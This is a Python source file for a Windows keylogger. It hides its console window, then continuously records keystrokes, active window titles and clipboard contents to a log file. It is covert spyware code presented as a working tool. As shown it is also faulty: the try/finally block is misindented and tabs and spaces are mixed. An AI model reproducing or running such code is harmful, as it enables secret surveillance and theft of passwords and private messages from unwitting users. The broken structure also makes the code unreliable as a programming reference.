import ctypes
import logging

kernel32 = ctypes.windll.kernel32
user32 = ctypes.windll.user32

user32.ShowWindow(kernel32.GetConsoleWindow(), 0)

def get_current_window():

	GetForegroundWindow = user32.GetForegroundWindow
	GetWindowTextLength = user32.GetWindowTextLengthW
	GetWindowText = user32.GetWindowTextW

	hwnd = GetForegroundWindow()
	length = GetWindowTextLength(hwnd)
	buff = ctypes.create_unicode_buffer(length + 1)

	GetWindowText(hwnd, buff, length + 1)

	return buff.value

def get_clipboard():

	CF_TEXT = 1

	kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
	kernel32.GlobalLock.restype = ctypes.c_void_p
	kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]

	user32.GetClipboardData.restype = ctypes.c_void_p
	user32.OpenClipboard(0)

	IsClipboardFormatAvailable = user32.IsClipboardFormatAvailable
	GetClipboardData = user32.GetClipboardData
	CloseClipboard = user32.CloseClipboard

	try:
		if IsClipboardFormatAvailable(CF_TEXT):
			data = GetClipboardData(CF_TEXT)
			data_locked = kernel32.GlobalLock(data)
			text = ctypes.c_char_p(data_locked)
			value = text.value
			kernel32.GlobalUnlock(data_locked)
			return value.decode('utf-8')
		finally:
			CloseClipboard()

def get_keystrokes(log_dir, log_name):

	logging.basicConfig(filename=(log_dir +"\\" + log_name), level=logging.DEBUG, format='%(message)s')

	GetAsyncKeyState = user32.GetAsyncKeyState
    special_keys = {0x08: 'BS', 0x09: 'Tab', 0x10: 'Shift', 0x11: 'Ctrl', 0x12: 'Alt', 0x14: 'CapsLock', 0x1b: 'Esc', 0x20: 'Space', 0x2e: 'Del'}
    current_window = None
    line = []

    while True:

    	if current_window != get_current_window():
    		current_window = get_current_window()
    		logging.info(str(current_window).encode('utf-8'))

    	for i in range(1, 256):
    		if GetAsyncKeyState(i) & 1:
    			if i in special_keys:
    				logging.info("<{}>".format(special_keys[i]))
    			elif i == 0x0d:
    				logging.info(line)
    				line.clear()
    			elif i == 0x63 or i == 0x43 or i == 0x56 or i == 0x76:
    				clipboard_data = get_clipboard()
    				logging.info("[CLIPBOARD] {}".format(clipboard_data))
    			elif 0x30 <= i <= 0x5a:
    				line.append(chr(i))
